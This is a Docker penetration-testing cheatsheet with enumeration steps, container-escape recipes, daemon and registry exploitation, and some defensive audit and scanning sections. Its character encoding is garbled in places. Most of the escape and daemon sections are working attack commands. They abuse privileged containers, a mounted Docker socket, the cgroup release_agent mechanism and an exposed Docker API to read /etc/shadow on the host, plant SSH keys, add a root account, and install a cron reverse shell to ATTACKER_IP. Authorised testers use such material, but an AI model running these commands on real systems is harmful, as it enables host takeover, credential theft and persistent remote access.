# üê≥ Docker Pentesting Cheatsheet

```
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïë   
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù    ‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù   
```

---

## üîç Docker Enumeration

### From Inside Container
```bash
# Check if you're in a container
cat /proc/1/cgroup 2>/dev/null | grep -i docker
ls -la /.dockerenv

# Environment info
env | grep -i docker
hostname
cat /etc/hosts

# Check mounted volumes
df -h
mount | grep -E "^/dev"
cat /proc/mounts

# Check capabilities
capsh --print
cat /proc/self/status | grep Cap

# Check for Docker socket
ls -la /var/run/docker.sock
ls -la /run/docker.sock
```

### From Host
```bash
# Docker info
docker version
docker info
docker system info

# List containers
docker ps -a

# List images
docker images

# Inspect container
docker inspect CONTAINER_ID

# Check container config
docker inspect --format='{{.Config}}' CONTAINER_ID
docker inspect --format='{{.HostConfig}}' CONTAINER_ID
```

---

## üöÄ Container Escape Techniques

### 1. Privileged Container Escape
```bash
# Check if privileged
cat /proc/self/status | grep -i cap
# CapEff: 0000003fffffffff = privileged

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Now access host at /mnt/host

# Alternative: use fdisk to find partition
fdisk -l
mount /dev/vda1 /mnt/host

# Add SSH key for persistence
mkdir -p /mnt/host/root/.ssh
echo "YOUR_SSH_KEY" >> /mnt/host/root/.ssh/authorized_keys
```

### 2. Docker Socket Escape
```bash
# Check for socket
ls -la /var/run/docker.sock

# If socket is mounted, escape via new container
docker -H unix:///var/run/docker.sock ps

# Create privileged container with host mount
docker -H unix:///var/run/docker.sock run -it --rm --privileged \
  -v /:/host alpine chroot /host bash

# Or directly execute on host
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine \
  chroot /host /bin/sh -c 'cat /etc/shadow'
```

### 3. CAP_SYS_ADMIN Escape
```bash
# Check for SYS_ADMIN
cat /proc/self/status | grep CapEff

# Create cgroup to escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output
EOF
chmod +x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

### 4. Sensitive Mount Escape
```bash
# If /etc is mounted
echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd

# If /root/.ssh is accessible
echo "YOUR_SSH_KEY" >> /root/.ssh/authorized_keys

# If cron directories are mounted
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > /etc/cron.d/shell
```

### 5. release_agent Escape
```bash
# Works when cgroup v1 and CAP_SYS_ADMIN
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo $t/c > $d/release_agent
echo "#!/bin/sh
$1 > $t/o" > /c
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```

---

## üîç Docker Image Analysis

### Extract Image Contents
```bash
# Save image as tar
docker save IMAGE_NAME -o image.tar

# Extract
mkdir image_extracted
tar -xf image.tar -C image_extracted/

# Analyze layers
cd image_extracted
cat manifest.json | jq .

# Extract each layer
for layer in */layer.tar; do
    tar -tvf "$layer"
done
```

### Search for Secrets
```bash
# In image layers
find . -name "*.tar" -exec tar -tvf {} \; | grep -E "\.(pem|key|env|conf|config|json|yml|yaml)$"

# Extract and search
for layer in */layer.tar; do
    tar -xf "$layer" -C /tmp/search/
done
grep -rn "password\|api_key\|secret\|token" /tmp/search/

# Using Dive
dive IMAGE_NAME
# Interactive analysis of layers
```

### Trivy Scan
```bash
# Scan image for vulnerabilities
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL nginx:latest

# Scan with secret detection
trivy image --scanners vuln,secret nginx:latest

# Output as JSON
trivy image -f json -o results.json nginx:latest
```

---

## üîê Docker Daemon Exploitation

### Exposed Docker API (Port 2375/2376)
```bash
# Check if exposed
curl http://TARGET:2375/version
curl http://TARGET:2375/info

# List containers
curl http://TARGET:2375/containers/json

# Create malicious container
curl -X POST -H "Content-Type: application/json" \
  http://TARGET:2375/containers/create?name=pwned \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /etc/shadow > /output/shadow"],
    "Binds": ["/:/host"],
    "Privileged": true
  }'

# Start container
curl -X POST http://TARGET:2375/containers/pwned/start

# Or use docker directly
docker -H tcp://TARGET:2375 ps
docker -H tcp://TARGET:2375 run -it --rm -v /:/host alpine chroot /host
```

### Docker Registry Exploitation
```bash
# Check for registry (port 5000)
curl http://TARGET:5000/v2/

# List repositories
curl http://TARGET:5000/v2/_catalog

# List tags
curl http://TARGET:5000/v2/REPO_NAME/tags/list

# Get manifest
curl http://TARGET:5000/v2/REPO_NAME/manifests/TAG

# Pull and analyze image
docker pull TARGET:5000/REPO_NAME:TAG
```

---

## üõ°Ô∏è Security Audit

### Docker Bench Security
```bash
# Run audit
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
./docker-bench-security.sh

# Or via Docker
docker run -it --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /var/lib:/var/lib \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /usr/lib/systemd:/usr/lib/systemd \
  -v /etc:/etc --label docker_bench_security \
  docker/docker-bench-security
```

### Check Container Security Config
```bash
# Privileged check
docker inspect --format='{{.HostConfig.Privileged}}' CONTAINER

# Capabilities
docker inspect --format='{{.HostConfig.CapAdd}}' CONTAINER
docker inspect --format='{{.HostConfig.CapDrop}}' CONTAINER

# Network mode
docker inspect --format='{{.HostConfig.NetworkMode}}' CONTAINER

# PID namespace
docker inspect --format='{{.HostConfig.PidMode}}' CONTAINER

# User
docker inspect --format='{{.Config.User}}' CONTAINER

# Read-only rootfs
docker inspect --format='{{.HostConfig.ReadonlyRootfs}}' CONTAINER

# Seccomp profile
docker inspect --format='{{.HostConfig.SecurityOpt}}' CONTAINER
```

---

## üß™ Vulnerable Lab Setups

### Intentionally Vulnerable Containers
```bash
# Vulnerable Docker socket
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu

# Privileged container
docker run -it --rm --privileged ubuntu

# With SYS_ADMIN capability
docker run -it --rm --cap-add=SYS_ADMIN ubuntu

# Host network
docker run -it --rm --network=host ubuntu

# Host PID namespace
docker run -it --rm --pid=host ubuntu
```

---

## üìã Docker Pentesting Checklist

```markdown
‚ñ° Check if inside container (/.dockerenv, cgroups)
‚ñ° Enumerate capabilities (capsh --print)
‚ñ° Check for Docker socket mount
‚ñ° Check for privileged mode
‚ñ° Enumerate mounted volumes
‚ñ° Search for secrets in environment variables
‚ñ° Analyze Dockerfile / image layers
‚ñ° Check for exposed Docker API (2375/2376)
‚ñ° Check for exposed registries (5000)
‚ñ° Run Docker Bench Security
‚ñ° Attempt container escape if vulnerabilities found
```

---

## üîó Related Cheatsheets

- [Kubernetes Pentesting](./Kubernetes-Pentesting.md)
- [Linux Privilege Escalation](../Linux-PrivEsc/README.md)

---

**Back to Overview:** [üê≥ Container Security](./README.md)
